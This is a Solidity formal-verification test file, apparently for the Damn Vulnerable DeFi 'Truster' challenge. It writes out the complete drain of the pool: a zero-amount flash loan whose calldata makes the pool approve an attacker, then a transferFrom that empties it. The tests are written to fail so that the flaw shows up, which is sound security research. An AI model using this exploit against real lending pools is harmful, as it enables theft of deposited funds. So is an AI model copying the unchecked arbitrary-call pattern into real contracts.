// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {SymTest} from "halmos-cheatcodes/SymTest.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

/**
 * @title TrusterLenderPool Formal Verification
 * @notice Verifies that flash loans cannot be used to set arbitrary token approvals.
 *
 * VULNERABILITY: The pool executes arbitrary calldata on an arbitrary target
 * via target.functionCall(data). An attacker can make the pool call
 * token.approve(attacker, type(uint256).max), then drain the pool in a second tx.
 */
/// @custom:halmos --solver-timeout-assertion 10000
contract TrusterVerification is SymTest, Test {
    DamnValuableToken token;
    TrusterLenderPool pool;

    uint256 constant POOL_INITIAL_BALANCE = 1_000_000 ether;

    function setUp() public {
        // Deploy token (mints max to deployer)
        token = new DamnValuableToken();

        // Deploy pool
        pool = new TrusterLenderPool(token);

        // Fund pool
        token.transfer(address(pool), POOL_INITIAL_BALANCE);
    }

    /**
     * Property: After a zero-amount flash loan, the pool should not have approved
     * any tokens to the borrower/attacker.
     *
     * We craft the specific attack: borrow 0, call token.approve(attacker, max)
     * Expected: FAIL -- the pool approves tokens to the attacker.
     */
    function check_pool_cannot_approve_external_addresses() public {
        address attacker = address(0xBAD);

        // Before the flash loan, pool has zero allowance to attacker
        uint256 allowanceBefore = token.allowance(address(pool), attacker);
        assertEq(allowanceBefore, 0);

        // The attack: borrow 0 tokens, but make the pool call token.approve(attacker, max)
        bytes memory approveCalldata = abi.encodeWithSelector(
            token.approve.selector,
            attacker,
            type(uint256).max
        );

        // Flash loan with amount=0 so we don't need to repay anything
        // target=token, data=approve(attacker, max)
        pool.flashLoan(0, attacker, address(token), approveCalldata);

        // Check: pool's allowance to attacker should still be 0
        uint256 allowanceAfter = token.allowance(address(pool), attacker);
        assertEq(allowanceAfter, 0, "Pool should not have approved tokens to attacker");
    }

    /**
     * Property: After any flash loan that succeeds (balance check passes),
     * the pool should not have increased its token allowance to any address.
     *
     * We test with a symbolic target and symbolic data, but constrained to
     * the approve(address, uint256) function selector on the token contract.
     *
     * Expected: FAIL with counterexample showing the approval attack.
     */
    function check_flashloan_preserves_zero_allowance(uint256 approveAmount) public {
        vm.assume(approveAmount > 0);

        address attacker = svm.createAddress("attacker");
        vm.assume(attacker != address(0));
        vm.assume(attacker != address(pool));
        vm.assume(attacker != address(token));

        uint256 allowanceBefore = token.allowance(address(pool), attacker);

        // Construct the attack calldata
        bytes memory data = abi.encodeWithSelector(
            token.approve.selector,
            attacker,
            approveAmount
        );

        // Execute with 0 borrow amount, targeting the token contract
        pool.flashLoan(0, attacker, address(token), data);

        uint256 allowanceAfter = token.allowance(address(pool), attacker);

        // Property: allowance should not increase
        assertEq(allowanceAfter, allowanceBefore, "Flash loan should not change pool allowances");
    }

    /**
     * Property: After a flash loan where the pool calls approve, the attacker
     * can then drain the pool using transferFrom.
     *
     * This demonstrates the complete attack chain.
     * Expected: FAIL -- attacker can drain the pool.
     */
    function check_pool_balance_preserved_after_flashloan(uint256 drainAmount) public {
        vm.assume(drainAmount > 0 && drainAmount <= POOL_INITIAL_BALANCE);

        address attacker = address(0xBAD);

        // Step 1: Flash loan to set approval
        bytes memory approveCalldata = abi.encodeWithSelector(
            token.approve.selector,
            attacker,
            type(uint256).max
        );
        pool.flashLoan(0, attacker, address(token), approveCalldata);

        // Step 2: Attacker drains pool using the approval
        vm.prank(attacker);
        token.transferFrom(address(pool), attacker, drainAmount);

        // Check: pool should still have its initial balance
        assertEq(
            token.balanceOf(address(pool)),
            POOL_INITIAL_BALANCE,
            "Pool should not lose tokens"
        );
    }
}
